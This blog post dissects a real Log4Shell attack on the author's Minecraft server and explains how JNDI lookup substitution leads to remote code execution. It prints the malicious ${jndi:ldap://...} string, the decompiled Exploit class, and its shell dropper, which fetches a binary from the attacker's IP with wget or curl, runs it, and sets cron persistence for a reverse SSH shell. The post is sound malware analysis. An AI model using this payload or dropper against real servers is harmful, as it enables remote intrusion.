In case you haven't heard, there's been a bit of an illness going around. No, not COVID. I'm talking about [Log4Shell](https://en.wikipedia.org/wiki/Log4Shell), possibly one of the worst zero-day vulnerabilities in the history of cybersecurity. It originates from [Log4j2](https://logging.apache.org/log4j/2.x/), the premier logging framework for modern Java, which can be found in thousands of applications (including Minecraft). The power of Log4Shell cannot be understated; an attacker may be able to get remote code execution simply by making a vulnerable server simply log a specific string.

Today I checked the Discord server for my SMP, and was greeted with a rather unexpected surprsie:

<figure style="max-width: 358px">
    <img src="/blogposts/dissecting-log4shell/log4shell-bitcraft.png" alt="picture of the offending message">
    <figcaption>This lovely Discord-Minecraft bridge is powered by <a href="https://github.com/adrian154/minelink">Minelink</a>.</figcaption>
</figure>

This is a pretty stock-standard attempt to exploit Log4Shell, which I have thankfully patched my server against. Essentially, Log4J provides a functionality called *message lookup substitution*: when you log a message using Log4J, it looks for segments enclosed in `${ }` and replaces those segments with a dynamically retrieved value. One of the systems which Log4j can use to retrieve data is the [Java Naming and Directory Interface](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface), whose purpose is to allow applications to look up information given a short, portable name. Now, the really terrifying part is that JNDI may contact an [LDAP](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol) server, which returns a response serialized as a Java class. The value of that response is extracted by **executing the class**. And in just three easy steps, you've got remote code execution!

Interestingly enough, attacks like this have been known about [since 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf). However, it wasn't until December 4th, 2021 (when Log4j's maintainer submitted a patch to the project's repository to restrict which protocols lookups could access) that the world realized that half of all Java applications had just become a ticking time bomb.

Tracing the timeline of this exploit yields some fascinating discussion, but let's get back to our bad actor from earlier.

The attack occurred this morning at 4:53 AM UTC. Here's what it looked like in the console:

```plaintext
[4:53:39 AM] [INFO] UUID of player FermatSleep is 9abd3b4d-a8cd-4290-acc5-303c74da3e3f
[4:53:39 AM] [INFO] FermatSleep[/195.154.52.77:51192] logged in with entity id 1092165 at ([world]114.5, 72.0, -37.5)
[4:53:41 AM] [INFO] FermatSleep: ${jndi:ldap://195.154.52.77:1389/a}
[4:53:43 AM] [INFO] FermatSleep lost connection: Disconnected
```

According to [AbuseIPDB](https://www.abuseipdb.com/check/195.154.52.77), this particular host has been scanning for servers to attack for about two days now. A quick IP-to-ASN lookup reveals that the attack was launched from an IP belonging to AS12876, so one of [Scaleway](https://www.scaleway.com/en/)'s servers. We can use [ldapsearch](https://github.com/bindle/ldap-utils) to simulate the request that this message would have triggered.

```plaintext
$ ldapsearch -x -H ldap://195.154.52.77:1389/a
# extended LDIF
#
# LDAPv3
# base <> (default) with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
javaClassName: foo
javaCodeBase: http://195.154.52.77:8000/
objectClass: javaNamingReference
javaFactory: Exploit

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Essentially, this reply says that to retrieve the requested value, the client should download `Exploit.class` from `http://195.154.52.77:8000/` and execute it. (Very subtle naming there.). Downloading and decompiling the class yields its source code:

```java
/* Decompiler 14ms, total 275ms, lines 67 */
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class Exploit {
   public static String script = "url=http://195.154.52.77:8000/mc_server.jar;remote_ip=195.154.52.77;port=$(wget -O- http://$remote_ip:8000/port 2>/dev/null) ;[ $? -ne 0 ] && port=$(curl http://$remote_ip:8000/port 2>/dev/null) ;wget --no-check-certificate $url > /dev/null 2>&1 || curl -k -O $url > /dev/null 2>&1 ;chmod +x ./mc_server.jar;nohup ./mc_server.jar -b $port > /dev/null 2>&1 &cmd=\"$(pwd)/mc_server.jar -b $port\";(crontab -l ;  echo \"@reboot $cmd\" ) | sort - | uniq - | crontab - ;echo done ;";

   public static String execCmd(String var0) {
      String var1 = null;
      String[] var2 = new String[]{"/bin/sh", "-c", var0};

      try {
         InputStream var3 = Runtime.getRuntime().exec(var2).getInputStream();
         Throwable var4 = null;

         try {
            Scanner var5 = (new Scanner(var3)).useDelimiter("\\A");
            Throwable var6 = null;

            try {
               var1 = var5.hasNext() ? var5.next() : null;
            } catch (Throwable var31) {
               var6 = var31;
               throw var31;
            } finally {
               if (var5 != null) {
                  if (var6 != null) {
                     try {
                        var5.close();
                     } catch (Throwable var30) {
                        var6.addSuppressed(var30);
                     }
                  } else {
                     var5.close();
                  }
               }

            }
         } catch (Throwable var33) {
            var4 = var33;
            throw var33;
         } finally {
            if (var3 != null) {
               if (var4 != null) {
                  try {
                     var3.close();
                  } catch (Throwable var29) {
                     var4.addSuppressed(var29);
                  }
               } else {
                  var3.close();
               }
            }

         }
      } catch (IOException var35) {
         var35.printStackTrace();
      }

      return var1;
   }

   public Exploit() throws Exception {
      execCmd(script);
   }
}
```

*Decompiled using [jdec.app](https://jdec.app), go check it out!*

Essentially, this payload tries to execute some commands on the target machine:

```bash
url=http://195.154.52.77:8000/mc_server.jar;remote_ip=195.154.52.77;
port=$(wget -O- http://$remote_ip:8000/port 2>/dev/null) ;[ $? -ne 0 ] && port=$(curl http://$remote_ip:8000/port 2>/dev/null) ;
wget --no-check-certificate $url > /dev/null 2>&1 || curl -k -O $url > /dev/null 2>&1 ;
chmod +x ./mc_server.jar;
nohup ./mc_server.jar -b $port > /dev/null 2>&1 &cmd=\"$(pwd)/mc_server.jar -b $port\";(crontab -l ;  echo \"@reboot $cmd\" ) | sort - | uniq - | crontab - ;echo done ;
```

Needless to say, this is not how you run a Minecraft server. The script downloads a binary payload and then dynamically retrieves which port to phone home on from an endpoint called `http://195.154.52.77:8000/port`, which at the time of writing is 31463. (Looking at the headers set on the response from that endpoint also revealed that the server is powered by [simplehttp](https://github.com/bitly/simplehttp) 0.6, running on Python 3.8.10). This port is then passed to the payload, which is saved to a file called "mc_server.jar" to avoid arousing suspicion but is actually written in Go.

```plaintext
$ file mc_server.jar
mc_server.jar: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=ojJR3xcBkteWK4xWptDc/hF_tAQVMNfAbpoZ4Kkik/2jwNMERfF4KTuAdVK_0q/BkcBVr6Mnr8QyxLTfPDi, stripped
```

Running `strings` on the payload also reveals a wealth of interesting information, such as the name of the malware author and his RSA pubkey.

```plaintext
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOjnUF/J249WuSeaDSlEnOeP1n/75iHQxRK8xjuB1J0FWTATtZcmBjtsGFX6nvv0vkS3kkhp7+Ba+B0GurEK+hdsPYvqMAPydq02iuPojsKOrDuVaPAox+kbmNTR3NEZ/rfd7OYzYNoK+mA/wqJl8K5+BaxUlXbNkKaO5IUbKP2XxLHz4IxRfNEAtl1iscTi0ckdrs4ZNK+PSKE+/Q0seOicuTlkRViP+M1G67mOi9Q12khrRlXwR0nsYuNFc73jWNH2oKoCllUqPHcHsfspvFZ56XzgTx3tZG1L57kfQCF6ErpbTyG8C0ov0rNm7fbcH8sRjYglnA1qc8mV1gVPc8VOZZp+0vvaA+Kv2ZEmMSbhyORC/HM8uCYGbZ8oW1jxZKaSpVasVT8UsbR5bHKM67xXsgZrIvXLGzIDu7QAe3VL1rm7MMe25K10kSkWi6ZuH1UVSuNw+y75igRxOHIox9PElUvVnVTEgIpHTjirY0g/PNmaQ6BlPuRvRFJF3SIKOy5gsZbATj7jhhI5Hj3LvioRwgYe1f0rnn0/Yx7r9tAq5edVk9rkLCUcWh8lbGoZ4Vr/qTYMn4dMPCr78oQ3nX/W6PuDdH8Dxmulq9alrotNcGaznnxnaOixZOCaRKbrMGLje+tXMTSvIJ8aN7Z+puvkIBE4fxMBt2GznN9Whg0Q== rafael@rafael-acer
```

Rafael, you sly dog! If you had used C, I might respect you a little more. Scrolling through the absolutely enormous output reminds me that golang still lacks a functional tree shaker, or at least it's not doing its job. The numerous mentions to `ssh` suggest that the binary establishes a reverse shell so that Mr. Rafael here can log into your server to further pursue his shenanigans. Indeed, a little more investigation shows that this is merely an off-the-shelf [reverse SSH](https://github.com/Fahrj/reverse-ssh) server whose source can be found on GitHub. 

# Epilogue

If you enjoyed this blogpost, please go checkout the [LunaSec](https://www.lunasec.io/docs/blog/log4j-zero-day/) article on Log4Shell, which inspired this journey and made it possible. Special thanks to the folks over on the [Admincraft Discord server](https://discord.gg/MZfRYb7) (especially itaquito and fr&ouml;gg), who were the first to sniff out some of this information.